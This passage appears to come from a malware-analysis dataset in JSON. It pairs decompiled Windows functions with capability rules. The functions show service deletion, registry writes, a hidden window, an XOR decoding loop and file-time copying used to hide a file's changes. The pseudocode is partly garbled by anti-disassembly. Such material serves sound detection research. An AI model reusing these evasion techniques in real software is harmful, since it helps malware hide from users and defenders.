0xffffffff;\n            puVar5 = (*_sym.imp.MSVCRT.dll___p__fmode)();\n            *puVar5 = *0x420824;\n            puVar5 = (*_sym.imp.MSVCRT.dll___p__commode)();\n            *puVar5 = *0x420820;\n            *0x420830 = *_sym.imp.MSVCRT.dll__adjust_fdiv;\n            fcn.00404e41();\n            if (*0x4207e0 == 0) {\n                (*_sym.imp.MSVCRT.dll___setusermatherr)(0x404e3e);\n            }\n            fcn.00404e2c();\n            sub.MSVCRT.dll__initterm(0x406008, 0x40600c);\n            uStack112 = *0x42081c;\n            (*_sym.imp.MSVCRT.dll___getmainargs)\n                      (&stack0xffffff9c, &stack0xffffff8c, &stack0xffffff98, *0x420818, &stack0xffffff90);\n            sub.MSVCRT.dll__initterm(0x406000, 0x406004);\n            puVar6 = *_sym.imp.MSVCRT.dll__acmdln;\n            if (*puVar6 != 0x22) {\n                do {\n                    if (*puVar6 < 0x21) goto code_r0x00404db5;\n                    puVar6 = puVar6 + 1;\n                } while( true );\n            }\n            do {\n                puVar6 = puVar6 + 1;\n                if (*puVar6 == 0) break;\n            } while (*puVar6 != 0x22);\n            if (*puVar6 != 0x22) goto code_r0x00404db5;\n            do {\n                puVar6 = puVar6 + 1;\ncode_r0x00404db5:\n            } while ((*puVar6 != 0) && (*puVar6 < 0x21));\n            uStack52 = 0;\n            (*_sym.imp.KERNEL32.dll_GetStartupInfoA)(&stack0xffffffa0);\n            if ((uStack52 & 1) == 0) {\n                uStack48 = 10;\n            }\n            uVar3 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(0, 0, puVar6, uStack48);\n            uStack108 = main(uVar3);\n            (*_sym.imp.MSVCRT.dll_exit)(uStack108);\n            uVar3 = sub.MSVCRT.dll__XcptFilter(**puVar9, puVar9);\n            return uVar3;\n        }\n        in_AF = 9 < (uVar2 & 0xf) | in_AF;\n        piVar1 = (uVar2 & 0xffff0000 | CONCAT11((uVar2 >> 8) + in_AF, uVar2 + in_AF * '\\x06') & 0xff0f) + 0x2a;\n        *piVar1 = *piVar1 - (unaff_EBX + 1);\n        uVar2 = uVar2 + 1;\n    }\n    uStack40 = 0x404c93;\n    uVar3 = fcn.004033f0(uVar2, var_8h);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)();\n    return uVar3;\n}\n",
        "token_count": 1393
    },
    "00401300": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401300(uint hSCManager, uint lpServiceName)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenServiceA)(hSCManager, lpServiceName, 0xf01ff);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    uVar2 = (*_sym.imp.ADVAPI32.dll_DeleteService)(iVar1);\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return uVar2;\n}\n",
        "token_count": 127
    },
    "004017b0": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401829) overlaps instruction at (ram,0x00401828)\n// \n// WARNING: Removing unreachable block (ram,0x00401826)\n\nbool fcn.004017b0(void)\n\n{\n    uint8_t *puVar1;\n    char cVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t extraout_ECX;\n    int32_t unaff_EBX;\n    uint *unaff_EDI;\n    char *pcVar5;\n    bool bVar6;\n    unkbyte6 Var7;\n    char *pcStack8;\n    \n    pcStack8 = NULL;\n    Var7 = fcn.00401000(&pcStack8);\n    bVar6 = Var7 == 0;\n    if (bVar6) {\n        return false;\n    }\n    if ((!bVar6) && (bVar6)) {\n        uVar3 = in(Var7 >> 0x20);\n        *unaff_EDI = uVar3;\n        if (&stack0xfffffff4 < 1) {\n            puVar1 = extraout_ECX + -0x71f00fb3;\n            *puVar1 = *puVar1 >> 2 | *puVar1 << 6;\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    puVar1 = unaff_EBX + -0x3f7a03bb;\n    *puVar1 = *puVar1 ^ extraout_ECX;\n    if (*puVar1 == 0) {\n        return false;\n    }\n    iVar4 = -1;\n    pcVar5 = pcStack8;\n    do {\n        if (iVar4 == 0) break;\n        iVar4 = iVar4 + -1;\n        cVar2 = *pcVar5;\n        pcVar5 = pcVar5 + 1;\n    } while (cVar2 != '\\0');\n    iVar4 = (*_sym.imp.SHLWAPI.dll_SHSetValueA)(0x80000002, 0x4204c0, \"&ea\\t\\'LBm0\");\n    return iVar4 == 0;\n}\n",
        "token_count": 476
    },
    "00402250": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "create or open file"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402263) overlaps instruction at (ram,0x00402262)\n// \n\nvoid __cdecl fcn.00402250(uint arg_8h)\n\n{\n    uint8_t *unaff_EBX;\n    \n    *unaff_EBX = *unaff_EBX & 0xc3;\n    (*_sym.imp.KERNEL32.dll_CreateFileA)();\n    return;\n}\n",
        "token_count": 91
    },
    "00403830": {
        "rules": [
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040386a) overlaps instruction at (ram,0x00403869)\n// \n// WARNING: Removing unreachable block (ram,0x00403860)\n// WARNING: Removing unreachable block (ram,0x0040386f)\n\nbool fcn.00403830(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uchar var_10ch;\n    uint var_10bh;\n    uint var_8h;\n    uint var_4h;\n    \n    var_10ch = 0;\n    var_4h = 0x104;\n    puVar2 = &var_10bh;\n    for (iVar1 = 0x40; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    *puVar2 = 0;\n    *(puVar2 + 2) = 0;\n    iVar1 = fcn.00403700(0x80000001, str._bmmSh, str._WKtJ, &var_8h, &var_10ch, &var_4h);\n    if (iVar1 != 0) {\n        iVar1 = fcn.004037b0(&var_10ch);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 306
    },
    "00404bd0": {
        "rules": [
            "hide graphical window"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00404bd0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.USER32.dll_CreateWindowExA)\n                      (0, 0x4202c8, 0x420810, 0xcf0000, 0x80000000, 0, 0x80000000, 0, 0, 0, arg_8h, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.USER32.dll_ShowWindow)(iVar1, 0);\n    return 1;\n}\n",
        "token_count": 140
    },
    "00403cb0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nvoid __cdecl fcn.00403cb0(int32_t arg_8h, int32_t arg_ch, int32_t arg_10h, int32_t arg_14h)\n\n{\n    uint8_t uVar1;\n    int32_t unaff_EDI;\n    float10 in_ST0;\n    float10 in_ST1;\n    float10 in_ST2;\n    float10 in_ST3;\n    float10 in_ST4;\n    float10 in_ST5;\n    float10 in_ST6;\n    float10 in_ST7;\n    int32_t var_8h;\n    uint var_1h;\n    \n    var_8h = 0;\n    if (0 < arg_14h) {\n        do {\n            uVar1 = *(var_8h + arg_10h) ^ *(var_8h % arg_ch + arg_8h);\n            if ((-1 < uVar1) && (-1 >= uVar1)) {\n                *(unaff_EDI + 0x1c) = in_ST0;\n                unaff_EDI = unaff_EDI + 5;\n                var_8h = var_8h + 5;\n                in_ST0 = in_ST1;\n                in_ST1 = in_ST2;\n                in_ST2 = in_ST3;\n                in_ST3 = in_ST4;\n                in_ST4 = in_ST5;\n                in_ST5 = in_ST6;\n                in_ST6 = in_ST7;\n            }\n            *(var_8h + arg_10h) = arg_14h ^ uVar1;\n            var_8h = var_8h + 1;\n        } while (var_8h < arg_14h);\n    }\n    return;\n}\n",
        "token_count": 403
    },
    "00403b40": {
        "rules": [
            "get common file path"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00403ba7) overlaps instruction at (ram,0x00403ba4)\n// \n\nuint __cdecl fcn.00403b40(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    bool bVar10;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    int32_t var_4h;\n    \n    var_4h = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    bVar10 = true;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    if ((!bVar10) && (bVar10)) {\n    // WARNING: Bad instruction - Truncating control flow here\n        halt_baddata();\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x420304;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)(&var_12ch, 0, &var_28h);\n    iVar2 = var_4h;\n    if ((arg_ch == -1) && (iVar2 = fcn.00402250(arg_8h),  iVar2 == -1)) {\n        return 0;\n    }\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1236
    }
}